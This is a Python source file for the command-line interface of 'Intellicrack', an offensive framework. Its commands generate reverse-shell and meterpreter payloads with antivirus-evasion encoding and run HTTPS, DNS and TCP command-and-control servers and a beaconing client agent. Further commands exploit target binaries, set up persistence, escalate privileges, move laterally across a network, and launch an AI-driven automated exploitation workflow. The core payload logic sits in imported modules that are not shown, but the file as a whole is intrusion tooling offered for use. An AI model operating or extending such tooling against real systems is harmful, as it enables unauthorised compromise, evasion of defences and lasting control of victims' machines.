"""
Intellicrack Command Line Interface

Provides comprehensive CLI for all Intellicrack functionality including
payload generation, C2 management, and exploitation operations.
"""

import asyncio
import json
import logging
import os
import sys
import time
from typing import Optional

import click

# Add parent directory to path for imports
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

# Basic imports (with fallbacks for missing components)
try:
    from ..core.exploitation import Architecture, PayloadEngine, PayloadTemplates, PayloadType
except ImportError:
    PayloadEngine = None
    PayloadTemplates = None
    Architecture = None
    PayloadType = None

try:
    from ..utils.payload_result_handler import PayloadResultHandler
except ImportError:
    PayloadResultHandler = None

try:
    from ..core.c2 import C2Client, C2Server
except ImportError:
    C2Server = None
    C2Client = None
from ..utils.analysis.binary_analysis import analyze_binary
from ..utils.exploitation import exploit
from ..utils.patch_generator import generate_patch

# Import new exploitation modules
try:
    from ..ai.vulnerability_research_integration import VulnerabilityResearchAI
    from ..core.c2.c2_manager import C2Manager
    from ..core.exploitation.payload_engine import PayloadEngine as AdvancedPayloadEngine
    from ..core.exploitation.lateral_movement import LateralMovementManager
    from ..core.exploitation.persistence_manager import PersistenceManager
    from ..core.exploitation.privilege_escalation import PrivilegeEscalationManager
    from ..core.vulnerability_research.research_manager import CampaignType, ResearchManager
    from ..core.vulnerability_research.vulnerability_analyzer import (
        AnalysisMethod,
        VulnerabilityAnalyzer,
    )
    ADVANCED_MODULES_AVAILABLE = True
except ImportError:
    ADVANCED_MODULES_AVAILABLE = False

logger = logging.getLogger("IntellicrackLogger.CLI")


@click.group()
@click.option('--verbose', '-v', is_flag=True, help='Enable verbose output')
@click.option('--quiet', '-q', is_flag=True, help='Suppress non-essential output')
def cli(verbose: bool, quiet: bool):
    """Intellicrack - Advanced Binary Analysis and Exploitation Framework"""
    # Configure logging
    if verbose:
        logging.basicConfig(level=logging.DEBUG)
    elif quiet:
        logging.basicConfig(level=logging.ERROR)
    else:
        logging.basicConfig(level=logging.INFO)


@cli.group()
def payload():
    """Payload generation commands"""
    pass


@payload.command()
@click.option('--type', '-t', 'payload_type',
              type=click.Choice(['reverse_shell', 'bind_shell', 'meterpreter', 'custom']),
              default='reverse_shell', help='Type of payload to generate')
@click.option('--arch', '-a', 'architecture',
              type=click.Choice(['x86', 'x64', 'arm', 'arm64']),
              default='x64', help='Target architecture')
@click.option('--lhost', help='Listener host for reverse connections')
@click.option('--lport', type=int, help='Listener port')
@click.option('--encoding', '-e', multiple=True,
              help='Encoding schemes to apply (can be specified multiple times)')
@click.option('--output', '-o', help='Output file path')
@click.option('--format', '-f', 'output_format',
              type=click.Choice(['raw', 'exe', 'dll', 'powershell', 'python', 'c']),
              default='raw', help='Output format')
def generate(payload_type: str, architecture: str, lhost: Optional[str],
            lport: Optional[int], encoding: tuple, output: Optional[str],
            output_format: str):
    """Generate a custom payload with various options"""
    try:
        engine = PayloadEngine()

        # Build target info and options
        target_info = {
            'os_type': 'unknown',
            'os_version': 'unknown',
            'architecture': architecture.lower(),
            'protections': [],
            'av_products': [],
            'network_config': {},
            'process_info': {}
        }

        options = {
            'output_format': output_format
        }

        # Add connection parameters
        if lhost:
            options['lhost'] = lhost
        if lport:
            options['lport'] = lport

        # Add encoding
        if encoding:
            options['encoding_schemes'] = list(encoding)

        click.echo(f"Generating {payload_type} payload for {architecture}...")

        # Generate payload
        result = engine.generate_payload(
            PayloadType[payload_type.upper()],
            Architecture[architecture.upper()],
            target_info,
            options
        )

        # Save output
        if output:
            with open(output, 'wb') as f:
                f.write(result['payload'])
            click.echo(f"Payload saved to: {output}")
        else:
            # Display payload info
            click.echo(f"Payload size: {len(result['payload'])} bytes")
            null_byte = b'\x00'
            click.echo(f"Null bytes: {result['payload'].count(null_byte)}")

            if not click.get_text_stream('stdout').isatty():
                # Output to pipe
                click.get_binary_stream('stdout').write(result['payload'])
            else:
                # Display hex dump for terminal
                from ..utils.hex_utils import create_hex_dump
                click.echo("\nPayload hex dump:")
                click.echo(create_hex_dump(result['payload']))

        click.echo("Payload generated successfully!")

    except Exception as e:
        logger.error(f"Payload generation failed: {e}")
        click.echo(f"Error: {e}", err=True)
        sys.exit(1)


@payload.command()
@click.option('--category', '-c',
              type=click.Choice(['shell', 'persistence', 'privilege_escalation',
                               'lateral_movement', 'steganography', 'anti_analysis']),
              help='Template category')
def list_templates(category: Optional[str]):
    """List available payload templates"""
    try:
        templates = PayloadTemplates()
        available = templates.list_templates(category)

        click.echo("Available payload templates:")
        for cat, template_list in available.items():
            click.echo(f"\n{cat.upper()}:")
            for template in template_list:
                click.echo(f"  - {template}")

    except Exception as e:
        logger.error(f"Failed to list templates: {e}")
        click.echo(f"Error: {e}", err=True)
        sys.exit(1)


@payload.command()
@click.argument('category')
@click.argument('template_name')
@click.option('--arch', '-a', 'architecture',
              type=click.Choice(['x86', 'x64', 'arm', 'arm64']),
              default='x64', help='Target architecture')
@click.option('--param', '-p', multiple=True, help='Template parameters (key=value)')
@click.option('--output', '-o', help='Output file path')
def from_template(category: str, template_name: str, architecture: str,
                 param: tuple, output: Optional[str]):
    """Generate payload from template"""
    try:
        engine = PayloadEngine()
        templates = PayloadTemplates()

        # Parse parameters
        params = {}
        for p in param:
            if '=' in p:
                key, value = p.split('=', 1)
                params[key] = value

        # Get template
        arch = Architecture[architecture.upper()]
        template = templates.get_template(category, template_name, arch, **params)

        if not template:
            click.echo(f"Template not found: {category}/{template_name}", err=True)
            sys.exit(1)

        click.echo(f"Generating payload from template: {template_name}")

        # Generate from template
        target_info = {
            'os_type': 'unknown',
            'os_version': 'unknown',
            'architecture': architecture.lower(),
            'protections': [],
            'av_products': [],
            'network_config': {},
            'process_info': {}
        }

        options = {
            'mode': 'template',
            'template': template
        }

        # Determine payload type from template category
        payload_type_map = {
            'reverse_shell': PayloadType.REVERSE_SHELL,
            'bind_shell': PayloadType.BIND_SHELL,
            'staged': PayloadType.STAGED_PAYLOAD
        }
        payload_type = payload_type_map.get(category.lower(), PayloadType.REVERSE_SHELL)

        result = engine.generate_payload(
            payload_type,
            Architecture[architecture.upper()],
            target_info,
            options
        )

        # Save output
        if output:
            with open(output, 'wb') as f:
                f.write(result['payload'])
            click.echo(f"Payload saved to: {output}")
        else:
            click.echo(f"Payload size: {len(result['payload'])} bytes")

        click.echo("Payload generated successfully!")

    except Exception as e:
        logger.error(f"Template payload generation failed: {e}")
        click.echo(f"Error: {e}", err=True)
        sys.exit(1)


@cli.group()
def c2():
    """Command and Control operations"""
    pass


@c2.command()
@click.option('--host', '-h', default='0.0.0.0', help='Listen address')
@click.option('--https-port', default=443, help='HTTPS port')
@click.option('--dns-port', default=53, help='DNS port')
@click.option('--tcp-port', default=4444, help='TCP port')
@click.option('--protocols', '-p', multiple=True,
              type=click.Choice(['https', 'dns', 'tcp']),
              default=['https'], help='Protocols to enable')
def server(host: str, https_port: int, dns_port: int, tcp_port: int, protocols: tuple):
    """Start C2 server"""
    try:
        config = {
            'https_enabled': 'https' in protocols,
            'dns_enabled': 'dns' in protocols,
            'tcp_enabled': 'tcp' in protocols,
            'https': {'host': host, 'port': https_port},
            'dns': {'host': host, 'port': dns_port, 'domain': 'example.com'},
            'tcp': {'host': host, 'port': tcp_port}
        }

        click.echo("Starting C2 server...")
        click.echo(f"Protocols: {', '.join(protocols)}")

        # Create and start server
        server = C2Server(config)

        # Add event handlers
        def on_session_connected(session):
            click.echo(f"[+] New session: {session.get('session_id', 'unknown')}")

        def on_session_disconnected(session):
            click.echo(f"[-] Session lost: {session.get('session_id', 'unknown')}")

        server.add_event_handler('session_connected', on_session_connected)
        server.add_event_handler('session_disconnected', on_session_disconnected)

        # Run server
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)

        try:
            loop.run_until_complete(server.start())
        except KeyboardInterrupt:
            click.echo("\nShutting down server...")
            loop.run_until_complete(server.stop())

    except Exception as e:
        logger.error(f"C2 server failed: {e}")
        click.echo(f"Error: {e}", err=True)
        sys.exit(1)


@c2.command()
@click.option('--server', '-s', required=True, help='C2 server address')
@click.option('--port', '-p', default=443, help='Server port')
@click.option('--protocol', type=click.Choice(['https', 'dns', 'tcp']),
              default='https', help='Communication protocol')
@click.option('--interval', '-i', default=60, help='Beacon interval in seconds')
def client(server: str, port: int, protocol: str, interval: int):
    """Start C2 client (agent)"""
    try:
        config = {
            'beacon_interval': interval,
            'protocols': {
                f'{protocol}_enabled': True,
                protocol: {
                    'host': server,
                    'port': port
                }
            }
        }

        click.echo(f"Connecting to C2 server at {server}:{port} via {protocol}")

        # Create and start client
        client = C2Client(config)

        # Run client
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)

        try:
            loop.run_until_complete(client.start())
        except KeyboardInterrupt:
            click.echo("\nDisconnecting from server...")
            loop.run_until_complete(client.stop())

    except Exception as e:
        logger.error(f"C2 client failed: {e}")
        click.echo(f"Error: {e}", err=True)
        sys.exit(1)


@c2.command()
@click.argument('session_id')
@click.argument('command')
def exec(session_id: str, command: str):
    """Execute command on remote session"""
    # This would connect to running C2 server
    click.echo(f"Executing on {session_id}: {command}")
    click.echo("Note: This requires a running C2 server instance")


@cli.command()
@click.argument('target')
@click.option('--type', '-t', 'exploit_type',
              type=click.Choice(['auto', 'buffer_overflow', 'format_string',
                               'heap_overflow', 'use_after_free']),
              default='auto', help='Exploit type')
@click.option('--payload', '-p', help='Custom payload or payload file')
@click.option('--output', '-o', help='Output exploit to file')
def exploit_target(target: str, exploit_type: str, payload: Optional[str],
                  output: Optional[str]):
    """Exploit a target binary or service"""
    try:
        click.echo(f"Exploiting target: {target}")
        click.echo(f"Exploit type: {exploit_type}")

        result = exploit(target, exploit_type, payload)

        if result['success']:
            click.echo("Exploitation successful!")

            if 'exploit_code' in result and output:
                with open(output, 'w') as f:
                    f.write(result['exploit_code'])
                click.echo(f"Exploit saved to: {output}")

            # Display results
            if 'session' in result:
                click.echo(f"Session established: {result['session']}")
            if 'details' in result:
                click.echo(f"Details: {result['details']}")
        else:
            click.echo("Exploitation failed!", err=True)
            if 'error' in result:
                click.echo(f"Error: {result['error']}", err=True)

    except Exception as e:
        logger.error(f"Exploitation failed: {e}")
        click.echo(f"Error: {e}", err=True)
        sys.exit(1)


@cli.command()
@click.argument('binary_path')
@click.option('--deep', '-d', is_flag=True, help='Perform deep analysis')
@click.option('--output', '-o', help='Save analysis report')
def analyze(binary_path: str, deep: bool, output: Optional[str]):
    """Analyze a binary file"""
    try:
        click.echo(f"Analyzing binary: {binary_path}")
        if deep:
            click.echo("Performing deep analysis...")

        result = analyze_binary(binary_path, detailed=deep)

        # Display analysis
        click.echo(f"\nBinary Type: {result.get('file_type', 'Unknown')}")
        click.echo(f"Architecture: {result.get('architecture', 'Unknown')}")
        click.echo(f"Size: {result.get('size', 0)} bytes")

        if 'protections' in result:
            click.echo("\nProtections:")
            for protection, enabled in result['protections'].items():
                status = "Enabled" if enabled else "Disabled"
                click.echo(f"  {protection}: {status}")

        if 'vulnerabilities' in result and result['vulnerabilities']:
            click.echo("\nPotential Vulnerabilities:")
            for vuln in result['vulnerabilities']:
                click.echo(f"  - {vuln}")

        if output:
            import json
            with open(output, 'w') as f:
                json.dump(result, f, indent=2)
            click.echo(f"\nAnalysis saved to: {output}")

    except Exception as e:
        logger.error(f"Analysis failed: {e}")
        click.echo(f"Error: {e}", err=True)
        sys.exit(1)


@cli.command()
@click.argument('binary_path')
@click.option('--offset', '-o', type=str, help='Patch offset (hex)')
@click.option('--data', '-d', help='Patch data (hex)')
@click.option('--nop-range', '-n', help='NOP range (start:end in hex)')
@click.option('--output', '-O', help='Output patched binary')
def patch(binary_path: str, offset: Optional[str], data: Optional[str],
         nop_range: Optional[str], output: Optional[str]):
    """Patch a binary file"""
    try:
        patches = []

        if offset and data:
            patches.append({
                'offset': int(offset, 16),
                'data': bytes.fromhex(data.replace(' ', ''))
            })

        if nop_range:
            start, end = nop_range.split(':')
            patches.append({
                'type': 'nop',
                'start': int(start, 16),
                'end': int(end, 16)
            })

        if not patches:
            click.echo("No patches specified!", err=True)
            sys.exit(1)

        click.echo(f"Patching binary: {binary_path}")

        patch_config = {
            'patches': patches,
            'output_path': output
        }
        result = generate_patch(binary_path, patch_config)

        if result['success']:
            click.echo("Patching successful!")
            click.echo(f"Output: {result.get('output_path', 'N/A')}")
        else:
            click.echo("Patching failed!", err=True)

    except Exception as e:
        logger.error(f"Patching failed: {e}")
        click.echo(f"Error: {e}", err=True)
        sys.exit(1)


# =============================================================================
# Enhanced CLI Commands for Advanced Exploitation Framework
# =============================================================================

@cli.group()
def advanced():
    """Advanced exploitation commands"""
    if not ADVANCED_MODULES_AVAILABLE:
        click.echo("Advanced modules not available. Please check installation.", err=True)
        sys.exit(1)


@advanced.group()
def advanced_payload():
    """Advanced payload generation commands"""
    pass


@advanced_payload.command()
@click.option('--type', '-t', 'payload_type',
              type=click.Choice(['reverse_shell', 'bind_shell', 'meterpreter', 'staged_payload', 'custom']),
              default='reverse_shell', help='Payload type')
@click.option('--arch', '-a', 'architecture',
              type=click.Choice(['x86', 'x64', 'arm', 'arm64']),
              default='x64', help='Target architecture')
@click.option('--lhost', required=True, help='Listener host')
@click.option('--lport', type=int, required=True, help='Listener port')
@click.option('--encoding', type=click.Choice(['none', 'polymorphic', 'metamorphic', 'xor', 'alpha']),
              default='polymorphic', help='Payload encoding')
@click.option('--evasion', type=click.Choice(['none', 'low', 'medium', 'high', 'maximum']),
              default='medium', help='Evasion level')
@click.option('--output', '-o', help='Output file path')
@click.option('--format', type=click.Choice(['raw', 'exe', 'dll', 'shellcode']),
              default='raw', help='Output format')
def advanced_generate(payload_type: str, architecture: str, lhost: str, lport: int,
                     encoding: str, evasion: str, output: Optional[str], format: str):
    """Generate advanced payload with evasion techniques"""
    try:
        from ..core.exploitation.payload_types import Architecture as AdvancedArchitecture
        from ..core.exploitation.payload_types import EncodingType
        from ..core.exploitation.payload_types import PayloadType as AdvancedPayloadType

        engine = AdvancedPayloadEngine()

        # Map CLI values to enum values
        payload_type_mapping = {
            'reverse_shell': AdvancedPayloadType.REVERSE_SHELL,
            'bind_shell': AdvancedPayloadType.BIND_SHELL,
            'meterpreter': AdvancedPayloadType.METERPRETER,
            'staged_payload': AdvancedPayloadType.STAGED_PAYLOAD,
            'custom': AdvancedPayloadType.CUSTOM
        }

        arch_mapping = {
            'x86': AdvancedArchitecture.X86,
            'x64': AdvancedArchitecture.X64,
            'arm': AdvancedArchitecture.ARM,
            'arm64': AdvancedArchitecture.ARM64
        }

        encoding_mapping = {
            'none': EncodingType.NONE,
            'polymorphic': EncodingType.POLYMORPHIC,
            'metamorphic': EncodingType.METAMORPHIC,
            'xor': EncodingType.XOR,
            'alpha': EncodingType.ALPHANUMERIC
        }

        target_info = {
            'os_type': 'windows',
            'architecture': architecture,
            'protections': ['aslr', 'dep'],
            'av_products': []
        }

        options = {
            'lhost': lhost,
            'lport': lport,
            'encoding': encoding_mapping[encoding],
            'evasion_level': evasion
        }

        click.echo(f"Generating {payload_type} payload...")
        click.echo(f"Target: {architecture}, Encoding: {encoding}, Evasion: {evasion}")

        result = engine.generate_payload(
            payload_type=payload_type_mapping[payload_type],
            architecture=arch_mapping[architecture],
            target_info=target_info,
            options=options
        )

        # Define save callback for file output
        def save_payload(payload_data: bytes, metadata: dict):
            if output:
                with open(output, 'wb') as f:
                    f.write(payload_data)
                click.echo(f"Payload saved to: {output}")
            else:
                # Display hex dump
                hex_dump = payload_data[:256].hex()  # First 256 bytes
                click.echo("\nPayload preview (first 256 bytes):")
                for i in range(0, len(hex_dump), 32):
                    click.echo(hex_dump[i:i+32])

        # Use common payload result handler
        if PayloadResultHandler:
            success = PayloadResultHandler.process_payload_result(result, click.echo, save_payload)
            if not success:
                sys.exit(1)
        else:
            # Fallback for missing handler
            if result['success']:
                save_payload(result['payload'], result['metadata'])
            else:
                click.echo(f"✗ Payload generation failed: {result.get('error', 'Unknown error')}")
                sys.exit(1)

    except Exception as e:
        logger.error(f"Advanced payload generation failed: {e}")
        click.echo(f"Error: {e}", err=True)
        sys.exit(1)


@advanced.group()
def advanced_c2():
    """Advanced C2 infrastructure commands"""
    pass


@advanced_c2.command()
@click.option('--protocol', type=click.Choice(['http', 'https', 'tcp', 'udp', 'dns']),
              default='https', help='C2 protocol')
@click.option('--port', '-p', type=int, help='Listen port')
@click.option('--encryption', type=click.Choice(['aes256', 'xor', 'rc4', 'chacha20']),
              default='aes256', help='Encryption method')
@click.option('--interface', '-i', default='0.0.0.0', help='Listen interface')
@click.option('--config', '-c', help='Configuration file path')
def start(protocol: str, port: Optional[int], encryption: str, interface: str, config: Optional[str]):
    """Start advanced C2 server"""
    try:
        manager = C2Manager()

        # Set default ports
        default_ports = {'http': 8080, 'https': 8443, 'tcp': 4444, 'udp': 5555, 'dns': 5353}
        if not port:
            port = default_ports.get(protocol, 8080)

        server_config = {
            'protocol': protocol,
            'port': port,
            'interface': interface,
            'encryption_method': encryption.lower(),
            'max_sessions': 100,
            'session_timeout': 300
        }

        if config:
            with open(config, 'r') as f:
                file_config = json.load(f)
                server_config.update(file_config)

        click.echo(f"Starting C2 server on {interface}:{port} ({protocol})")
        click.echo(f"Encryption: {encryption}")

        result = manager.start_server(server_config)

        if result['success']:
            click.echo("✓ C2 server started successfully!")
            click.echo(f"  Server ID: {result['server_id']}")
            click.echo(f"  Address: {result['address']}")

            # Keep server running
            try:
                click.echo("Press Ctrl+C to stop server...")
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                click.echo("\nStopping C2 server...")
                manager.stop_server()
                click.echo("Server stopped.")
        else:
            click.echo(f"✗ Failed to start C2 server: {result.get('error')}")
            sys.exit(1)

    except Exception as e:
        logger.error(f"C2 server failed: {e}")
        click.echo(f"Error: {e}", err=True)
        sys.exit(1)


@c2.command()
def status():
    """Show C2 server status and active sessions"""
    try:
        manager = C2Manager()
        status_info = manager.get_server_status()

        click.echo("C2 Server Status:")
        click.echo(f"  Running: {status_info['running']}")
        click.echo(f"  Active Sessions: {status_info['active_sessions']}")
        click.echo(f"  Total Connections: {status_info['total_connections']}")

        if status_info['sessions']:
            click.echo("\nActive Sessions:")
            for session in status_info['sessions']:
                click.echo(f"  • {session['id']} - {session['remote_ip']} ({session['platform']})")

    except Exception as e:
        logger.error(f"Failed to get C2 status: {e}")
        click.echo(f"Error: {e}", err=True)
        sys.exit(1)


@advanced.group()
def research():
    """Vulnerability research commands"""
    pass


@research.command()
@click.argument('target_path')
@click.option('--type', '-t', 'campaign_type',
              type=click.Choice(['binary_analysis', 'fuzzing', 'vulnerability_assessment', 'patch_analysis', 'hybrid_research']),
              default='binary_analysis', help='Research campaign type')
@click.option('--output', '-o', help='Output directory for results')
@click.option('--timeout', type=int, default=3600, help='Analysis timeout (seconds)')
@click.option('--use-ai', is_flag=True, help='Use AI-guided analysis')
def analyze(target_path: str, campaign_type: str, output: Optional[str], timeout: int, use_ai: bool):
    """Run vulnerability research analysis"""
    try:
        if not os.path.exists(target_path):
            click.echo(f"Target file not found: {target_path}", err=True)
            sys.exit(1)

        if use_ai:
            # Use AI-guided analysis
            ai_researcher = VulnerabilityResearchAI()

            click.echo(f"Running AI-guided analysis on {target_path}...")
            result = ai_researcher.analyze_target_with_ai(target_path)

            if result['success']:
                click.echo("✓ AI analysis completed!")

                # Show risk assessment
                risk = result['risk_assessment']
                click.echo(f"  Risk Level: {risk['overall_risk']}")
                click.echo(f"  Risk Score: {risk['risk_score']:.2f}")
                click.echo(f"  Exploitation Likelihood: {risk['exploitation_likelihood']:.2f}")

                # Show AI recommendations
                recommendations = result['ai_recommendations']
                if recommendations:
                    click.echo(f"\nAI Recommendations ({len(recommendations)}):")
                    for i, rec in enumerate(recommendations[:5], 1):
                        click.echo(f"  {i}. {rec}")

                # Show exploitation strategies
                strategies = result['exploitation_strategies']
                if strategies:
                    click.echo(f"\nExploitation Strategies ({len(strategies)}):")
                    for strategy in strategies[:3]:
                        vuln = strategy['vulnerability']
                        click.echo(f"  • {vuln['type']} ({vuln['severity']}) - {strategy['approach']}")
                        click.echo(f"    Confidence: {strategy['confidence']:.2f}")

        else:
            # Use standard research manager
            manager = ResearchManager()
            analyzer = VulnerabilityAnalyzer()

            campaign_type_mapping = {
                'binary_analysis': CampaignType.BINARY_ANALYSIS,
                'fuzzing': CampaignType.FUZZING,
                'vulnerability_assessment': CampaignType.VULNERABILITY_ASSESSMENT,
                'patch_analysis': CampaignType.PATCH_ANALYSIS,
                'hybrid_research': CampaignType.HYBRID_RESEARCH
            }

            click.echo(f"Running {campaign_type} analysis on {target_path}...")

            # Run direct analysis
            result = analyzer.analyze_vulnerability(
                target_path=target_path,
                analysis_method=AnalysisMethod.HYBRID,
                vulnerability_types=None
            )

            if result['success']:
                vulnerabilities = result['vulnerabilities']
                click.echo(f"✓ Analysis completed - {len(vulnerabilities)} vulnerabilities found")

                # Categorize vulnerabilities
                critical = [v for v in vulnerabilities if v['severity'] == 'critical']
                high = [v for v in vulnerabilities if v['severity'] == 'high']
                medium = [v for v in vulnerabilities if v['severity'] == 'medium']

                click.echo(f"  Critical: {len(critical)}")
                click.echo(f"  High: {len(high)}")
                click.echo(f"  Medium: {len(medium)}")

                # Show top vulnerabilities
                if vulnerabilities:
                    click.echo("\nTop Vulnerabilities:")
                    for vuln in vulnerabilities[:5]:
                        click.echo(f"  • {vuln['type']} ({vuln['severity']}) - {vuln['description']}")

        # Save results if output specified
        if output and result['success']:
            os.makedirs(output, exist_ok=True)
            result_file = os.path.join(output, f"analysis_results_{int(time.time())}.json")

            with open(result_file, 'w') as f:
                json.dump(result, f, indent=2, default=str)

            click.echo(f"\nResults saved to: {result_file}")

    except Exception as e:
        logger.error(f"Vulnerability research failed: {e}")
        click.echo(f"Error: {e}", err=True)
        sys.exit(1)


@advanced.group()
def post_exploit():
    """Post-exploitation commands"""
    pass


@post_exploit.command()
@click.option('--platform', type=click.Choice(['windows', 'linux', 'macos']),
              required=True, help='Target platform')
@click.option('--method', type=click.Choice(['auto', 'registry', 'service', 'scheduled_task', 'startup']),
              default='auto', help='Persistence method')
@click.option('--payload-path', help='Path to payload for persistence')
def persist(platform: str, method: str, payload_path: Optional[str]):
    """Establish persistence on target system"""
    try:
        manager = PersistenceManager()

        click.echo(f"Establishing {method} persistence on {platform}...")

        result = manager.establish_persistence(
            payload_path=payload_path or '/tmp/implant',
            target_os=platform,
            privilege_level='user',
            stealth_level='medium'
        )

        if result['success']:
            click.echo("✓ Persistence established successfully!")
            click.echo(f"  Method: {result['method']}")
            click.echo(f"  Location: {result['location']}")
            if 'cleanup_cmd' in result:
                click.echo(f"  Cleanup: {result['cleanup_cmd']}")
        else:
            click.echo(f"✗ Persistence failed: {result.get('error')}")
            sys.exit(1)

    except Exception as e:
        logger.error(f"Persistence establishment failed: {e}")
        click.echo(f"Error: {e}", err=True)
        sys.exit(1)


@post_exploit.command()
@click.option('--platform', type=click.Choice(['windows', 'linux', 'macos']),
              required=True, help='Target platform')
@click.option('--method', type=click.Choice(['auto', 'kernel_exploit', 'suid_binary', 'service_exploit']),
              default='auto', help='Privilege escalation method')
def escalate(platform: str, method: str):
    """Escalate privileges on target system"""
    try:
        manager = PrivilegeEscalationManager()

        click.echo(f"Attempting privilege escalation on {platform} using {method}...")

        result = manager.escalate_privileges(platform=platform, method=method)

        if result['success']:
            click.echo("✓ Privilege escalation successful!")
            click.echo(f"  Method: {result['method']}")
            click.echo(f"  New privileges: {result['privileges']}")
        else:
            click.echo(f"✗ Privilege escalation failed: {result.get('error')}")
            sys.exit(1)

    except Exception as e:
        logger.error(f"Privilege escalation failed: {e}")
        click.echo(f"Error: {e}", err=True)
        sys.exit(1)


@post_exploit.command()
@click.option('--method', type=click.Choice(['auto', 'smb', 'ssh', 'wmi', 'psexec']),
              default='auto', help='Lateral movement method')
@click.option('--target', help='Specific target IP (optional)')
def lateral(method: str, target: Optional[str]):
    """Perform lateral movement to other systems"""
    try:
        manager = LateralMovementManager()

        if target:
            click.echo(f"Attempting lateral movement to {target} using {method}...")
            result = manager.move_to_target(target, method=method)
        else:
            click.echo("Discovering targets for lateral movement...")
            result = manager.discover_targets()

            if result['success']:
                targets = result['targets']
                click.echo(f"✓ Discovered {len(targets)} potential targets:")

                for target_info in targets[:10]:  # Show first 10
                    click.echo(f"  • {target_info['ip']} - {target_info['hostname']} ({target_info['os']})")

                return

        if result['success']:
            click.echo("✓ Lateral movement successful!")
            click.echo(f"  Target: {result['target']}")
            click.echo(f"  Method: {result['method']}")
        else:
            click.echo(f"✗ Lateral movement failed: {result.get('error')}")
            sys.exit(1)

    except Exception as e:
        logger.error(f"Lateral movement failed: {e}")
        click.echo(f"Error: {e}", err=True)
        sys.exit(1)


@advanced.command()
@click.argument('target_path')
@click.option('--lhost', required=True, help='Listener host')
@click.option('--lport', type=int, required=True, help='Listener port')
@click.option('--platform', type=click.Choice(['windows', 'linux', 'macos']),
              default='windows', help='Target platform')
@click.option('--output', '-o', help='Save detailed results to file')
def auto_exploit(target_path: str, lhost: str, lport: int, platform: str, output: Optional[str]):
    """Run full automated exploitation workflow"""
    try:
        if not os.path.exists(target_path):
            click.echo(f"Target file not found: {target_path}", err=True)
            sys.exit(1)

        ai_researcher = VulnerabilityResearchAI()

        target_info = {
            'binary_path': target_path,
            'platform': platform,
            'network_config': {
                'lhost': lhost,
                'lport': lport
            }
        }

        click.echo(f"Starting automated exploitation of {os.path.basename(target_path)}...")
        click.echo(f"Target platform: {platform}")
        click.echo(f"Callback: {lhost}:{lport}")
        click.echo("=" * 50)

        result = ai_researcher.execute_automated_exploitation(target_info)

        if result['success']:
            click.echo("✓ Automated exploitation completed successfully!")
            click.echo(f"  Workflow ID: {result['workflow_id']}")
            click.echo(f"  Final Status: {result['final_status']}")

            # Show exploitation timeline
            timeline = result['exploitation_timeline']
            click.echo(f"\nExploitation Timeline ({len(timeline)} phases):")
            for entry in timeline:
                status_symbol = "✓" if entry['status'] == 'completed' else "✗"
                click.echo(f"  {status_symbol} {entry['phase'].replace('_', ' ').title()}")

            # Show AI adaptations
            adaptations = result['ai_adaptations']
            if adaptations:
                click.echo(f"\nAI Adaptations Applied ({len(adaptations)}):")
                for adaptation in adaptations[:3]:
                    click.echo(f"  • {adaptation}")

        else:
            click.echo(f"✗ Automated exploitation failed: {result.get('error')}")

            # Show what phases completed
            if 'exploitation_phases' in result:
                phases = result['exploitation_phases']
                click.echo("\nPhase Results:")
                for phase_name, phase_result in phases.items():
                    status = "✓" if phase_result.get('success') else "✗"
                    click.echo(f"  {status} {phase_name.replace('_', ' ').title()}")

            sys.exit(1)

        # Save detailed results
        if output:
            with open(output, 'w') as f:
                json.dump(result, f, indent=2, default=str)
            click.echo(f"\nDetailed results saved to: {output}")

    except Exception as e:
        logger.error(f"Automated exploitation failed: {e}")
        click.echo(f"Error: {e}", err=True)
        sys.exit(1)


def main():
    """Main entry point for CLI"""
    cli(prog_name='intellicrack')


if __name__ == '__main__':
    main()
